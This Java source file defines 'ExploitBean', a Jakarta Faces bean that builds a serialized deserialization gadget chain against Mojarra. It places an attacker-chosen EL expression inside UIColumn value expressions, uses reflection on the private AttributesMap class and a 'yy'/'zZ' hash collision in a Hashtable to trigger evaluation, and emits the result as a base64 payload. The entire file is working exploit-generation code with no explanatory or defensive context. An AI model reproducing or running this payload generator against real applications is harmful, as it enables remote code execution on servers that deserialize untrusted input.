package com.mojaraagadget;

import jakarta.el.ELContext;
import jakarta.el.ExpressionFactory;
import jakarta.el.ValueExpression;
import jakarta.enterprise.context.RequestScoped;
import jakarta.faces.component.UIColumn;
import jakarta.faces.context.FacesContext;
import jakarta.inject.Named;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Map;



@Named
@RequestScoped
public class ExploitBean {

    private String payload;
    private String elString;

    public void setPayload(String payload){
        this.payload = payload;
    }
    public String getPayload(){
        return this.payload;
    }

    public void setElString(String elString){
        this.elString = elString;
    }
    public String getElString(){
        return this.elString;
    }


    public void generatePayload(){

        Hashtable payload = constructPayload(this.elString);

        try {
            this.payload = base64Serialize(payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private Object constructAttributesMap(UIColumn uiColumn){
        try {

            Class<?> clazz = Class.forName("jakarta.faces.component.UIComponentBase$AttributesMap");
            Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            Object attributesMap = constructor.newInstance(uiColumn);
            return attributesMap;

        }catch (Exception e){
            e.printStackTrace();
        }

        return null;
    }

    private UIColumn constructUiColumn(String elString){

        UIColumn uiColumn = new UIColumn();

        FacesContext ctx = FacesContext.getCurrentInstance();
        ELContext elContext = ctx.getELContext();
        ExpressionFactory expressionFactory = ctx.getApplication().getExpressionFactory();

        ValueExpression ve = expressionFactory.createValueExpression(elContext, elString, Object.class);

        // set the value expression for the UIComponent
        uiColumn.setValueExpression("yy",ve);
        uiColumn.setValueExpression("zZ",ve);

        return uiColumn;

    }

    private Hashtable constructPayload(String elString){

        FacesContext ctx = FacesContext.getCurrentInstance();
        ELContext elContext = ctx.getELContext();
        ExpressionFactory expressionFactory = ctx.getApplication().getExpressionFactory();

        // dummy ValueExpression to bypass class loading problems
        ValueExpression ve = expressionFactory.createValueExpression(elContext, "${1+1}", Object.class);

        UIColumn uiColumn = constructUiColumn(elString);

        Map innerMap1  = new Hashtable();
        Map innerMap2 = (Map) constructAttributesMap(uiColumn);

        // hash collision
        innerMap1.put("yy", 1);
        innerMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();

        // add the dummy ValueExpression to bypass class loading problems
        hashtable.put(ve, 0);

        // add the AttributesMap and the Hashtable
        hashtable.put(innerMap1, 1);
        hashtable.put(innerMap2, 2);

        return hashtable;

    }

    private String base64Serialize(Object obj) throws IOException {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(obj);
        String res = Base64.getEncoder().encodeToString(baos.toByteArray());

        return res;
    }

}
